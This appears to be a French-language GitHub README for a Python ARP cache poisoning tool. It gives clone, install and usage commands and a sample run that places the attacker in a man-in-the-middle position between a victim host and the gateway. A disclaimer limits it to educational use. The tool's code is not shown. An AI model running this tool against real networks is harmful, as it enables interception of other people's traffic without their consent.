# Installation :
```
# Cloner :
git clone https://github.com/PrestaDZ/ARP-Cache-poisoning.git

# Change directory :
cd ARP-Cache-poisoning

# Requirements :
pip3 install -r requirements.txt
```

# Usage :

```

$ sudo python3 acp.py --help

 ________      ________      ________
|\   __  \    |\   ____\    |\   __  \
\ \  \|\  \   \ \  \___|    \ \  \_\  \
 \ \   __  \   \ \  \        \ \   ____|
  \ \  \ \  \ __\ \  \____  __\ \  \___|
   \ \__\ \__\\__\ \_______\\__\ \__\
    \|__|\|__\|__|\|_______\|__|\|__|
    --< Arp cache poisoning python tool
    --< by Presta

usage: python3 acp.py [-h] -s SWITCH_IP -i VICTIM_IP

optional arguments:
  -h, --help            show this help message and exit
  -s SWITCH_IP, --switch-ip SWITCH_IP
                        L'adresse IP de la passerelle.
  -i VICTIM_IP, --victim-ip VICTIM_IP
                        L'adresse IP de la victime.

```

# Exemple :

```
$ sudo python3 acp.py -s 192.168.0.254 -i 192.168.0.10

 ________      ________      ________
|\   __  \    |\   ____\    |\   __  \
\ \  \|\  \   \ \  \___|    \ \  \_\  \
 \ \   __  \   \ \  \        \ \   ____|
  \ \  \ \  \ __\ \  \____  __\ \  \___|
   \ \__\ \__\\__\ \_______\\__\ \__\
    \|__|\|__\|__|\|_______\|__|\|__|
    --< Arp cache poisoning python tool
    --< by Presta

Envoi de 2 paquets ICMP à 192.168.0.10...
------------
Sent : 2 , Received : 0
Packet lost         : 1.0

[!] L'hôte ne répond pas au packets ICMP.
Envoi de 2 paquets ICMP à 192.168.0.254 ...
------------
Sent : 2 , Received : 2
Packet lost         : 0.0


-------------------------------------------
[i] Victime    Ip / MAC  -> 192.168.0.10  : 32:1a:u9:d4:f7:23
[i] Passerelle Ip / MAC  -> 192.168.0.254 : fa:18:8b:a6:21:ce

[+] Lancement de l'attaque ...
[i] Taper controle + C pour quitter le programme.
[+] Attaque lancée avec succès

```

Ce code a pour but de vous mettre dans une position de MiTM entre la victime et la passerelle en corrompant le cache ARP, il a été écrit pour un usage informatif et éducatif et non pour un usage illégal, il est interdit par la loi et punissable de l'utilisé sur un réseau ne vous appartenant pas, et je me désolidarise de ces actes.
